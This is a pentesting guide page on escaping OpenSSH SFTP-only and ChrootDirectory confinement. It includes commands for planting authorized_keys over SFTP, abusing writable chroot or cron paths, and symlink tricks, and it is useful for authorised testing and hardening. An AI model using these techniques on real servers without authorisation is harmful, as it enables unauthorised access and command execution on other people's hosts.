---
title: "Restricted shell and chroot escape: breaking out of SFTP-only confinement"
order: 4
description: "SFTP-only accounts are confined by OpenSSH's internal-sftp subsystem and usually a ChrootDirectory, meant to allow file transfer but not command execution. Escapes come from writable paths inside the chroot that the system acts on, SFTP features that reach outside, misconfigured chroot ownership, and chaining an SFTP write to a key or cron that the host executes with a real shell."
keywords:
  - internal-sftp
  - chrootdirectory
  - restricted shell
  - escape
  - forcecommand
---

# Restricted shell and chroot escape

Accounts meant only for file transfer are confined two ways in OpenSSH: `ForceCommand internal-sftp` (or the `sftp` subsystem) limits them to the SFTP protocol with no shell, and `ChrootDirectory` locks their filesystem view to a subtree. The goal of an escape is to turn that transfer-only access into command execution on the host. The routes exploit what the confinement does not cover: writable locations inside the chroot that a process outside acts on, SFTP operations that reach beyond the intended area, and chroot misconfigurations.

## Routes

```bash
# 1. the account also has shell access despite SFTP intent? test it:
ssh user@<target> id                      # if a shell returns, there is nothing to escape
# 2. write a key/cron/script the HOST executes with a real shell, via SFTP write:
#    - if your chroot home maps to a real user home, upload .ssh/authorized_keys then SSH
sftp user@<target> <<'E'
put authorized_keys .ssh/authorized_keys
E
ssh -i attacker_key user@<target>         # now a full session if the key is honoured
# 3. chroot misconfiguration: ChrootDirectory must be root-owned and not writable by
#    the user; if the chroot root (or a parent) is user-writable, it can be abused,
#    and writable system paths inside the chroot (cron.d, scripts run by root) execute
# 4. SFTP symlink/hardlink tricks to reference files outside the intended subtree
sftp> symlink / escape        # then browse "escape" if the server resolves it host-side
```

## Exploitation notes

- First confirm the confinement is real: many "SFTP-only" accounts actually still grant a shell (`ssh user@host id`), in which case there is no escape to perform.
- The most reliable escape is indirect: use the SFTP write to drop something the host executes with a real shell, an `authorized_keys` (if the chroot home is the actual home), a file in a writable `cron.d`/script path, or a web file if the chroot overlaps a webroot.
- A correctly configured `ChrootDirectory` is owned by root and not writable by the user up the whole path; violations of that (user-writable chroot or parent) are a direct weakness.
- Where the account maps to a system user whose home or scheduled jobs you can write, the transfer access converts to execution as that user; chain with the [key](weak-and-stolen-ssh-keys.md) technique.

## References

- [OpenSSH: ChrootDirectory and internal-sftp](https://man.openbsd.org/sshd_config#ChrootDirectory)
- [HackTricks: SSH restricted shell escape](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
